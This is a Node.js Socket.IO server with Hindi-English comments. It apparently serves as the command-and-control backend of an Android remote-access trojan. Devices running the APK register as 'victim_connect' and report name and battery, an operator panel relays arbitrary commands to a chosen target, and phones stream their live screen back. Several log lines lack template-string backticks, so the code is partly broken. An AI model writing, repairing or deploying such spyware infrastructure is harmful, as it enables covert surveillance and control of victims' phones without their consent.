const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require('path');

const app = express();
const server = http.createServer(app);

// CORS Policy (Cloud deployment ke liye zaroori)
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Static files (panel.html) ko root folder se serve karein
app.use(express.static(__dirname));
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Connected devices ki list manage karne ke liye
let devices = [];

io.on("connection", (socket) => {
    // ===> YAHAN THEEK KIYA GAYA HAI <===
    console.log([+] Ek naya user connect hua: ${socket.id});

    // APK 'victim_connect' bhejta hai, to hum use sunenge.
    socket.on('victim_connect', (data) => {
        const deviceId = socket.id;
        const deviceName = data.deviceName || 'Unknown Device';
        const battery = data.battery || '--';
        
        if (!devices.find(d => d.deviceId === deviceId)) {
            // ===> YAHAN THEEK KIYA GAYA HAI <===
            console.log([+] Device register hua: ${deviceName} (${deviceId}));
            devices.push({ deviceId, deviceName, battery });
        }
        
        io.emit('devices_list', devices);
    });

    // Panel se 'panel_command' aata hai, use APK ke command mein badlo.
    socket.on('panel_command', (command) => {
        if (!command.targetId) return;

        const eventType = command.type;
        const eventData = command.data || {};

        // ===> YAHAN THEEK KIYA GAYA HAI <===
        console.log([>] Panel se command aaya: '${eventType}', Bhej rahe hain -> ${command.targetId});
        
        io.to(command.targetId).emit(eventType, eventData);
    });
    
    // APK 'live_screen' bhejta hai, to hum use sunenge.
    socket.on('live_screen', (data) => {
        data.deviceId = socket.id;
        io.emit('live_screen_update', data);
    });

    // APK 'heartbeat' bhejta hai, to hum use sunenge.
    socket.on('heartbeat', (data) => {
        const device = devices.find(d => d.deviceId === socket.id);
        if (device && data.battery) {
            device.battery = data.battery;
            io.emit('status_update', { deviceId: socket.id, battery: data.battery });
            io.emit('devices_list', devices);
        }
    });

    // Connection tootne par
    socket.on("disconnect", () => {
        // ===> YAHAN THEEK KIYA GAYA HAI <===
        console.log([-] User disconnect hua: ${socket.id});
        devices = devices.filter(d => d.deviceId !== socket.id);
        io.emit('devices_list', devices);
    });
});

// Dynamic Port (Render ke liye zaroori)
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(Server port ${PORT} par chal raha hai);
});
